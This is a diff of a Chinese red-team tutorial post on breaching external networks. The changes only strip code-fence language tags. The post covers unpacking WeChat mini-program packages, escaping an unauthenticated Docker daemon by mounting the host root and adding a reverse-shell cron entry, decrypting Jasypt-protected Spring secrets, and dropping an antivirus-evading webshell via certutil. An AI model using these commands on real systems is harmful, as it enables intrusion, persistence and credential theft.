@@ -1,4 +1,4 @@
-# 攻防实战外网突破
+﻿# 攻防实战外网突破
 
 
 <!--more-->
@@ -51,19 +51,19 @@
 
 iOS wxapkg 文件存放路径为：
 
-```php
+```
 /var/mobile/Containers/Data/Application/{系统UUID}/Library/WechatPrivate/{user哈希值}/WeApp/LocalCache/release/{小程序的AppID}
 ```
 
 Android wxapkg 文件存放路径为：
 
-```php
+```
 /data/data/com.tencent.mm/MicroMsg/{user哈希值}/appbrand/pkg/
 ```
 
 Windows wxapkg 文件存放路径为：
 
-```php
+```
 C:\Users\{系统用户名}\Documents\WeChat Files\Applet\{小程序的AppID}\
 ```
 
@@ -89,7 +89,7 @@ C:\Users\{系统用户名}\Documents\WeChat Files\Applet\{小程序的AppID}\
 
 [https://sqlsec.lanzoub.com/i1NEP0mx694f](https://sqlsec.lanzoub.com/i1NEP0mx694f)
 
-```php
+```
 node wuWxapkg.js 1.wxapkg
 ```
 
@@ -170,13 +170,13 @@ Harbor是一个开源的容器镜像仓库管理器，旨在帮助组织存储�
 
 为了管理容器集群，Docker允许Daemon作为后台守护进程执行通过管理接口发送的Docker命令，使用参数-H 0.0.0.0:2375启动Docker Daemon时，将开放2375端口接收来自远程Docker客户端的命令。在这种情况下，2375端口被作为非加密端口暴露出来，并且不存在任何形式的身份验证，攻击者可以直接使用Docker命令连接到Docker Daemon，并对容器进行直接操作，配合根目录挂载即可实现容器逃逸。
 
-```php
+```
 #查看容器 docker -H tcp://<target>:2375 ps -a
 ```
 
 ![](https://qqq.gtimg.cn/music/photo_new/T053XD000001MHqGf3HNr4k.jpg)
 
-```php
+```
 #挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://<target>:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo '反弹shell命令' >> /mnt/var/spool/cron/crontabs/root
 ```
 
@@ -206,7 +206,7 @@ Spring 的配置文件中会有一些敏感信息，如数据库密码，因此�
 
 加密的内容需要用 ENC(..) 括起来，加密用的密码通过 jasypt.encryptor.password 指定。
 
-```php
+```
 spring: datasource: username: your-username password: ENC(encrypted-password)
 ```
 
@@ -255,7 +255,7 @@ import org.jasypt.util.text.BasicTextEncryptor; public class DecryptionExample {
 
 certutil 是 Windows 操作系统中的一个命令行工具，主要用于处理证书和加密相关的操作，利用 certutil的解密操作可以绕过杀软。
 
-```php
+```
 echo bash64编码后的免杀马 > myfile.jsp
 ```
 
